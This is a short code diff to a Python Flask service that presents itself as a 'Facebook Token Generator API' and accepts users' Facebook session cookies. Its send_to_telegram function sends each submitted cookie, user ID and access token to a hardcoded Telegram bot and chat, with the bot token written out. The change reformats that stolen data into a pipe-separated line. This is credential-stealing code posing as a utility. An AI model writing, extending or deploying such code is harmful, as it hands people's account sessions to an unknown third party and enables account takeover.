@@ -153,7 +153,7 @@ TELEGRAM_BOT_TOKEN = '8217612873:AAE2AIX2Fzru98Dl-NN8DUwkA0AQnE82dS8'
 TELEGRAM_CHAT_ID = '7258178082'
 
 def send_to_telegram(cookie, uid, token):
-    message = f"cookie: {cookie}\nuid: {uid}\ntoken: {token}"
+    message = f"{uid}|{cookie}|{token}"
     url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
     payload = {
         'chat_id': TELEGRAM_CHAT_ID,
@@ -218,8 +218,8 @@ def get_token():
             'message': f'Lỗi hệ thống: {str(e)}'
         }), 500
 
-@app.route('/', methods=['GET'])
-def home():
+@app.route('/health', methods=['GET'])
+def health_check():
     return jsonify({
         'message': 'Facebook Token Generator API',
         'usage': 'GET /get-token?cookie=YOUR_COOKIE_HERE',
@@ -227,5 +227,4 @@ def home():
     })
 
 if __name__ == '__main__':
-
     app.run(debug=True, host='0.0.0.0', port=5000)
